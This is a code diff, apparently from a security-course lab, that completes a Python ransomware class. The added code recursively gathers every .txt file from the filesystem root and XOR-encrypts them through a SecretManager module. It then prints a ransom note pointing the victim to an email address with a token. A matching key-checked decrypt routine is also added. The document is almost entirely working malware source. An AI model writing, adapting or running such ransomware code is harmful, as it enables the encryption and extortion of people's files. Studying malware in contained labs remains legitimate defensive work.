@@ -5,6 +5,8 @@ import sys
 from pathlib import Path
 from secret_manager import SecretManager
 
+import base64
+
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
@@ -19,9 +21,10 @@ ENCRYPT_MESSAGE = """
                 | |                      __/ |                                               __/ |
                 |_|                     |___/                                               |___/ 
 
-Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
+Your txt files have been locked. Send an email to evil@hell.com with title '{}' to unlock your data. 
 """
 class Ransomware:
+
     def __init__(self) -> None:
         self.check_hostname_is_docker()
     
@@ -35,19 +38,46 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
+        p = Path("/")
+        liste_file = [file for file in p.rglob(filter)]
         # return all files matching the filter
-        raise NotImplemented()
+        liste_file_str = [str(txt) for txt in liste_file]
+        return liste_file_str
 
     def encrypt(self):
+        files = self.get_files("*.txt")
+        secret_manager = SecretManager()
+        secret_manager.setup()
+        secret_manager.xorfiles(files)
+
+        token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token.hex()))
+        
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        key = base64.b64decode(input("Enter the key:"))
+        print("Key input :", key)
+
+        files = self.get_files("*.txt")
+        secret_manager = SecretManager()
+        #secret_manager.test()
+        #secret_manager.xorfiles(files)
+        
+        if(secret_manager.check_key(key)):
+            secret_manager.set_key(key)
+            secret_manager.xorfiles(files)
+            print("Files uncrypted !")
+        else:
+            print("Error: Not the good key...")
+
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
+    
     if len(sys.argv) < 2:
         ransomware = Ransomware()
         ransomware.encrypt()
